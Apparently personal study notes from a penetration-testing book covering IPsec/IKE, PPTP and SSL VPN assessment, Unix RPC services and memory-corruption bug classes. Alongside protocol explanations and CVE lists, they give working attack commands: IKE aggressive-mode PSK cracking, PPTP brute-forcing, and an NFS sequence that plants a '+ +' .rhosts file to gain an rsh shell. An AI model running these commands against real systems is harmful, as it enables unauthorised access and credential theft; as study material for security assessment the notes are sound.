+Standard Internet Protocol (IP) packets are inherently insecure. Most IPsec implementations use the Internet Key Exchange (IKE) service to provide authentication and key exchange when establishing and maintaining an IPsec connection. After authenticating and negotiating keying material through IKE, a Security Association (SA) is established between the client and IPsec server.
+
+IPSec - IKE + Auth Header (AH) + Encapsulating Security Payload (ESP) 
+
+ISAKMP and IKE 
+	Internet Security Association and Key Management Protocol - UDP 500
+	IKE supports 3 Auth - pre-shared keys(PSK), public key encryption and digital signatures.
+	IKE uses 2 Phases - 1st Auth the peer and establish ISAKMP SA and 2nd establish an Ipsec SA
+		IKE Phase 1st - Main mode and aggressive mode 
+		IKE Phase 2nd - Quick mode
+		
+	Main Mode - One key exchange using Diffie-Hellman(DH) to generate a mutual secret key. (Protect Identity of Client and data)
+		6 Messages are sent - 
+			Message 1: An IKE SA (not to be confused with an IPsec SA) proposal is sent to initiate the key exchange mechanism. 
+			Message 2: The IKE SA is accepted. 
+			Messages 3 and 4: DH public values (KE) are exchanged, along with a random data nonce payload for each party (Ni and Nr). From this exchange, a mutual secret key is computed. After this point, the shared keys computed from the DH exchange are used to encrypt IKE payloads. 
+			Messages 5 and 6: Authentication data (AUTH) is sent, protected by the DH shared secret generated previously. The identification of the parties (IDii and IDir) is also protected.
+		Note: DH computation is done after 1st Message and Peer ID are encrypted
+		
+	Aggressive Mode - Only 3 Messages are sent; Peer ID sent in clear text; Used in Remote VPN
+		Messages sent are -
+			Message 1: An IKE SA proposal is sent, along with a DH public value (KE), random nonce data (Ni), and identity information (IDii). Because the identity is passed in the first packet, before the DH exchange has completed, it cannot be encrypted. 
+			Message 2: The IKE SA is accepted, and the responder’s DH public value is sent, along with a nonce (Nr), identity information (IDir), and an authentication payload (AUTH). 
+			Message 3: Authentication information is sent back, protected by the DH secret key derived previously.
+
+Attacking IPsec VPNs
+	IPsec Service Endpoint Enumeration - Tools such as ike-scan
+	IPsec Service Endpoint Fingerprinting - Tools such as ike-scan
+	Supported Transform Enumeration -  Tools such as ike-scan
+		Values for field in ike-scan ($ ike-scan -M --trans=5,2,1,2 10.0.0.254)
+		• Encryption Algorithm: 1 (DES), 5 (3DES), 7/128 (128-bit AES) and 7/256 (256- bit AES) 
+		• Hash Algorithm: 1 (MD5) and 2 (SHA1) 
+		• Authentication Method: 1 (PSK), 3 (RSA signature), 64221 (hybrid mode) and 65001 (XAUTH) 
+		• DH Group: 1 (MODP 768), 2 (MODP 1024) and 5 (MODP 1536)
+	Investigating Known Weaknesses - PAGE 341
+		Denial-of-Service Vulnerabilities - Malformed IKE packet DoS (CVE-2005-1802); Negotiation slots exhaustion attack (CVE-2006-3906)
+	Aggressive Mode IKE PSK User Enumeration -  $ ike-scan --aggressive --multiline --id=royhills@hotmail.com 10.0.0.254
+	Aggressive Mode IKE PSK Cracking - 
+		$ ike-scan --aggressive --multiline --id=royhills@hotmail.com -pskcrack=netscreen.psk 10. 0.0.254
+		Then $ psk-crack netscreen.psk
+
+Microsoft PPTP - Microsoft’s Point-to-Point Tunnelling Protocol (PPTP) uses TCP port 1723
+	Due to protocol complexity and reliance on MS-CHAP for authentication, PPTPv1 and PPTPv2 are vulnerable to several offline cryptographic attacks.
+	Tools such as tch-ppt bruter ($ cat wordlist | thc-pptp-bruter 192.168.0.5)
+
+SSL VPNs - TCP 443 using only a web browser on client side
+	Basic SSL Querying  - $ openssl s_client -connect 172.16.2.2:443
+	Enumerating Weak Cipher Support - $ openssl ciphers ALL:eNULL
+		Ciphers used
+			RC4-MD5, which is a strong cipher using 128-bit RC4 encryption 
+			EXP-RC4-MD5, which is a weak cipher using exportable (40-bit) 
+			RC4 NULL-MD5, which performs no encryption at all
+		Then $ openssl s_client -cipher RC4-MD5(CIPHERS) -connect 172.16.3.18:443
+	Known SSL Vulnerabilities - PAGE 353
+		SSL implementation exploits - CVE-2000-0719 (Microsoft SSLPCT overflow, MS04- 011); CVE-2003-0818 (Microsoft ASN.1 heap overflow)
+		SSL VPN web interface issues - 
+			CVE-2006-5416 F5 FirePass 1000 SSL VPN 5.5 cross-site scripting issue 
+			CVE-2006-1357 F5 FirePass 4100 SSL VPN 5.4.2 cross-site scripting issue 
+			CVE-2005-4197  Nortel SSL VPN 4.2.1.6 OS command execution vulnerability
+
+VPN Services Countermeasures - PAGE 354
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+CHAPTER 13 - Assessing Unix RPC Services
+
+Remote Procedure Call (RPC) - 
+TCP and UDP port 111, and sometimes on TCP and UDP port 32771
+
+Enumerating Unix RPC Services - $ rpcinfo -p 192.168.0.50
+	status (rpc.statd); nlockmgr (rpc.lockd); nfsd; rquotad and rusersd
+
+Identifying RPC Services Without Portmapper Access - $ nmap -sR 10.0.0.9
+
+Connecting to RPC Services Without Portmapper Access - $ showmount -e 10.0.0.9
+
+RPC Service Vulnerabilities - PAGE 358
+	Integer Overflow - CVE-2003-0028 and CVE-2002-0391, and have multiple attack vectors, including .cmsd, ttdbserverd, and dmispd.
+	Abusing NFS and rpc.mountd (100005) - 
+		CVE-2003-0252 - xlog( ) function of the mountd service bundled with multiple Linux distributions (including Debian 8.0, Slackware 8.1, and Red Hat Linux 6.2) as part of the nfs-utils-1.0.3 package
+		CVE1999-0832 - Red Hat Linux 5.2 and Debian 2.1 and earlier relating to the rpc.nfsd service (as part of the nfs-server-2.2beta46 package) in November 1999
+		CVE-1999-0002 - NFS mountd service bundled with Red Hat Linux 5.1 (as part of the nfs-server-2.2beta29 package)
+		Listing and accessing exported directories through mountd and NFS - 
+			$ showmount -e 10.0.0.6 
+			$ mount 10.0.0.6:/home /mnt
+			$ cd jarvis 
+			$ echo + + > .rhosts 
+			$ cd / 
+			$ umount /mnt 
+			$ rsh -l jarvis 10.0.0.6 csh -i
+		Multiple Vendor rpc.statd (100024) Vulnerabilities - 
+			CVE-2000-0666 Red Hat 6.2, Mandrake 7.1, and other Linux distributions lsx.tgz, statdx2.tar.gz, and rpc-statd.c 
+			CVE-1999-0493 Solaris 2.5.1 statd.tar.gz 
+			CVE-1999-0018 and CVE-1999-0019 Solaris 2.4, IRIX, AIX, and HP-UX dropstatd (Solaris binary)
+		Solaris rpc.sadmind (100232) Vulnerabilities -
+			CVE-1999-0977 - sadmind service running on Solaris 2.6 and 2.7 can be exploited by issuing a crafted RPC request, resulting in a stack overflow
+			CVE-2003-0722 - Auth in sadmind EG $ perl rootdown.pl -h 10.0.0.9 -i
+		Multiple Vendor rpc.cmsd (100068) Vulnerabilities- PAGE 362
+		Multiple Vendor rpc.ttdbserverd (100083) Vulnerabilities - PAGE 363
+		
+Unix RPC Services Countermeasures - PAGE 364
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+CHAPTER 14 - Application=Level Risks
+
+Network Service Vulnerabilities and Attacks 
+	Memory Manipulation Attacks - BOF, Integer Overflow and Format String Bugs
+	
+	Runtime Memory Organization - Overwriting values within memory
+		(R)The Text Segment - Contains all compiled executable code
+		(RW)The data and BSS(Block Started by Symbol) segments - Contains all global variables for the program
+		(RWE)The stack - Dynamic store and manipulate program functions variable(Temporary)
+		The Heap - To store data that must exist after a function returns (and its variables)
+				Allocator - malloc( ) 
+				Deallocator - free( )
+		Processor Registers and Memory - Compiled machine code for execution, global variables (Data and BSS), local variables and pointer, and other data (heap). The processor reads and interprets values in memory by using registers. A register is an internal processor value that increments and jumps to point to memory addresses used during program execution. 3 Registers - eip (the instruction pointer), ebp (the stack frame pointer), and esp (the stack pointer).The stack pointer should always point to the last address on the stack as it grows and shrinks in size, and the stack frame pointer defines the start of the current function’s stack frame. The instruction pointer is an important register that points to compiled executable code (usually in the text segment) for execution by the processor.
+			
+Classic Buffer-Overflow Vulnerabilities (Stack Based)
+	Stack Overflow - By overflowing data on the stack
+		Stack smash (saved instruction pointer overwrite) - Crash the program, Compromising the logical program flow(using shellcode), Analyzing the program crash(Using gdb), Creating and injecting shellcode
+	Stack off-by-one (saved frame pointer overwrite) - By same length of code 
+		Analyzing the program crash, Exploiting an off-by-one bug to modify the instruction pointer, Exploiting an off-by-one bug to modify data in the parent function’s stack frame , Off-by-one effectiveness against different processor architectures 
+		
+Heap Overflows (Non-Stack based; Depends upon OS heap memory)
+	Other Heap Corruption Attacks  - Heap off-by-one and off-by-five bugs , Double-free bugs 
+	
+Integer Overflows - a delivery mechanism for a stack, heap, or static overflow to occur (depending on where the integer ends up in memory)
+	Heap Wrap-Around Attacks - OpenSSH 3.3 (CVE-2002-0639)
+	Negative-Size Bugs - Provide negate input
+	
+Format String Bugs -  A user can control the format parameter to a function such as printf( ) or syslog( ).
+	Reading Adjacent Items on the Stack, Reading Data from Any Address on the Stack, Overwriting Any Word in Memory 
+
+Mitigating Process Manipulation Risks 
+	Here are the five main approaches:
+	• Nonexecutable stack and heap implementation
+	• Use of canary values in memory - A canary value is a hashed word that is known by the system and checked during execution 
+	• Running unusual server architecture 
+	• Compiling applications from source 
+	• Active system call monitoring - IDS
